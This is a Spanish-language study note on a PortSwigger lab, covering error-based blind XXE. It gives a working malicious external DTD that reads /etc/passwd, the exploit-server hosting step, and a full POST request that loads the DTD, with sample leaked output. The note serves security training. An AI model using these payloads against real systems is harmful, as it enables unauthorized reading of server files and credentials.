---
aliases:
  - XXE 007 - error-based con DTD externo
  - blind xxe error based
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 007 — XXE ciego: error-based con DTD externo

> Lab: [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]:** la exfil por HTTP anda... hasta que el archivo tiene **saltos de línea** (`/etc/passwd`) que **rompen la URL**; o directamente **no tengo canal OOB** para el contenido.
- **Qué aprovecho:** el parser **muestra errores verbosos**.
- **Entonces:** fuerzo un error abriendo una ruta **inexistente cuyo nombre contiene el archivo** → el **mensaje de error** trae el contenido, y vuelve en la **respuesta** (no en el Collaborator).

## Cómo explotarlo (3 partes)

### 1. El DTD malicioso — qué debe contener

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).

<pre class="payload"><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
%eval;
%error;</code></pre>
- `%file` → lee `/etc/passwd`.
- `%error` → apunta a `file:///nonexistent/<contenido>` → el parser **falla y filtra el contenido**.
- `&#x25;` = `%` escapado (igual que en 006).

### 2. Hospedar en el exploit server
File `/exploit.dtd`, Body = el DTD, **Store** → `https://EXPLOIT.exploit-server.net/exploit.dtd`.

### 3. La request que carga el DTD
<pre class="payload"><code>POST /product/stock HTTP/1.1
Host: <mark>TARGET.web-security-academy.net</mark>
Content-Type: application/xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://<mark>EXPLOIT.exploit-server.net</mark>/exploit.dtd"&gt; %xxe;]&gt;
&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>

## Verificación
La **respuesta HTTP** trae:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Detalles que se pasan por alto
- **Acá el dato vuelve en la RESPUESTA**, no en el Collaborator (a diferencia de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]) → no hace falta pollear.
- Salida ideal para archivos **multilínea** (`/etc/passwd`).
- Requiere **errores verbosos**. Si los traga → volvé a exfil OOB (FTP) o [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008 — DTD local]].

→ **Siguiente:** ¿y si el server **no sale a internet** (no puedo ni cargar un DTD externo)? → [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008 — reutilizar DTD local]].
